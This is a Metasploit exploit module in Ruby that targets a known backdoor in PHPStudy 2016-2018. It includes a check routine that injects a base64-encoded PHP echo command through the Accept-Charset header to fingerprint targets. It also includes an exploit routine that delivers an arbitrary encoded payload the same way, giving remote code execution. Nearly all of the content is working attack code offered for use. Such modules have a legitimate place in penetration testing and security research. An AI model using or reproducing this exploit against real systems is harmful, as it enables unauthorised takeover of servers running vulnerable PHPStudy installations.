# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "PHPStudy Backdoor Remote Code execution",
      &#039;Description&#039;    => %q{
        This module can detect and exploit the backdoor of PHPStudy.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Dimensional&#039;,  #POC
          &#039;Airevan&#039;       #Metasploit Module
        ],
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;PHPStudy 2016-2018&#039;, {}]
        ],
      &#039;References&#039;    =>
        [
          [&#039;URL&#039;, &#039;https://programmer.group/using-ghidra-to-analyze-the-back-door-of-phpstudy.html&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Sep 20 2019",
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path&#039;, &#039;/&#039;])
      ])
  end
  def check
    uri = target_uri.path
    fingerprint = Rex::Text.rand_text_alpha(8)
    res = send_request_cgi({
      &#039;method&#039;  =>  &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(uri, &#039;index.php&#039;),
      &#039;headers&#039; =>  {
        &#039;Accept-Encoding&#039; =>  &#039;gzip,deflate&#039;,
        &#039;Accept-Charset&#039;  =>  Rex::Text.encode_base64("echo &#039;#{fingerprint}&#039;;")
      }
    })

    if res && res.code == 200 && res.body.to_s.include?(fingerprint)
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end
  def exploit
    uri = target_uri.path
    print_good("Sending shellcode")
    res = send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => normalize_uri(uri, &#039;index.php&#039;),
      &#039;headers&#039; => {
          &#039;Accept-Encoding&#039; => &#039;gzip,deflate&#039;,
          &#039;Accept-Charset&#039;  => Rex::Text.encode_base64(payload.encoded)
      }
  })
  end
end

